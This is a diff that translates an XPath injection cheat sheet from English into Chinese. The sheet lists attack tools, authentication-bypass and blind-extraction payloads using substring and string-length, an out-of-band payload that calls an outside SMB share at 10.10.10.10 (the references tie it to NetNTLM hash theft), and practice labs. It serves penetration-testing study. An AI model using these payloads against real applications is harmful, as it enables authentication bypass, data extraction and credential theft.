@@ -1,27 +1,29 @@
+[原文文档](README.en.md)
+
 # XPATH Injection
 
-> XPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents.
+> XPath注入是一种攻击技术，用于利用那些从用户提供的输入构造XPath（XML Path Language）查询来查询或导航XML文档的应用程序。
 
-## Summary
+## 摘要
 
-* [Tools](#tools)
-* [Methodology](#methodology)
-    * [Blind Exploitation](#blind-exploitation)
-    * [Out Of Band Exploitation](#out-of-band-exploitation)
-* [Labs](#labs)
-* [References](#references)
+* [工具](#工具)
+* [方法论](#方法论)
+    * [盲利用](#盲利用)
+    * [带外利用](#带外利用)
+* [实验室](#实验室)
+* [参考资料](#参考资料)
 
-## Tools
+## 工具
 
-* [orf/xcat](https://github.com/orf/xcat) - Automate XPath injection attacks to retrieve documents
-* [feakk/xxxpwn](https://github.com/feakk/xxxpwn) - Advanced XPath Injection Tool
-* [aayla-secura/xxxpwn_smart](https://github.com/aayla-secura/xxxpwn_smart) - A fork of xxxpwn using predictive text
+* [orf/xcat](https://github.com/orf/xcat) - 自动化XPath注入攻击以检索文档
+* [feakk/xxxpwn](https://github.com/feakk/xxxpwn) - 高级XPath注入工具
+* [aayla-secura/xxxpwn_smart](https://github.com/aayla-secura/xxxpwn_smart) - 使用预测文本的xxxpwn分支
 * [micsoftvn/xpath-blind-explorer](https://github.com/micsoftvn/xpath-blind-explorer)
-* [Harshal35/XmlChor](https://github.com/Harshal35/XMLCHOR) - Xpath injection exploitation tool
+* [Harshal35/XmlChor](https://github.com/Harshal35/XMLCHOR) - Xpath注入利用工具
 
-## Methodology
+## 方法论
 
-Similar to SQL injection, you want to terminate the query properly:
+类似于SQL注入，您想要正确终止查询：
 
 ```ps1
 string(//user[name/text()='" +vuln_var1+ "' and password/text()='" +vuln_var1+ "']/account/text())
@@ -46,34 +48,34 @@ x' or name()='username' or 'x'='y
 ') and starts-with(../password,'c
 ```
 
-### Blind Exploitation
+### 盲利用
 
-1. Size of a string
+1. 字符串的长度
 
     ```sql
     and string-length(account)=SIZE_INT
     ```
 
-2. Access a character with `substring`, and verify its value the `codepoints-to-string` function
+2. 使用`substring`访问字符，并使用`codepoints-to-string`函数验证其值
 
     ```sql
     substring(//user[userid=5]/username,2,1)=CHAR_HERE
     substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
     ```
 
-### Out Of Band Exploitation
+### 带外利用
 
 ```powershell
 http://example.com/?title=Foundation&type=*&rent_days=* and doc('//10.10.10.10/SHARE')
 ```
 
-## Labs
+## 实验室
 
-* [Root Me - XPath injection - Authentication](https://www.root-me.org/en/Challenges/Web-Server/XPath-injection-Authentication)
-* [Root Me - XPath injection - String](https://www.root-me.org/en/Challenges/Web-Server/XPath-injection-String)
-* [Root Me - XPath injection - Blind](https://www.root-me.org/en/Challenges/Web-Server/XPath-injection-Blind)
+* [Root Me - XPath注入 - 身份验证](https://www.root-me.org/en/Challenges/Web-Server/XPath-injection-Authentication)
+* [Root Me - XPath注入 - 字符串](https://www.root-me.org/en/Challenges/Web-Server/XPath-injection-String)
+* [Root Me - XPath注入 - 盲注](https://www.root-me.org/en/Challenges/Web-Server/XPath-injection-Blind)
 
-## References
+## 参考资料
 
-* [Places of Interest in Stealing NetNTLM Hashes - Osanda Malith Jayathissa - March 24, 2017](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)
-* [XPATH Injection - OWASP - January 21, 2015](https://www.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010))
+* [窃取NetNTLM哈希的有趣位置 - Osanda Malith Jayathissa - 2017年3月24日](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)
+* [XPATH注入 - OWASP - 2015年1月21日](https://www.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010))
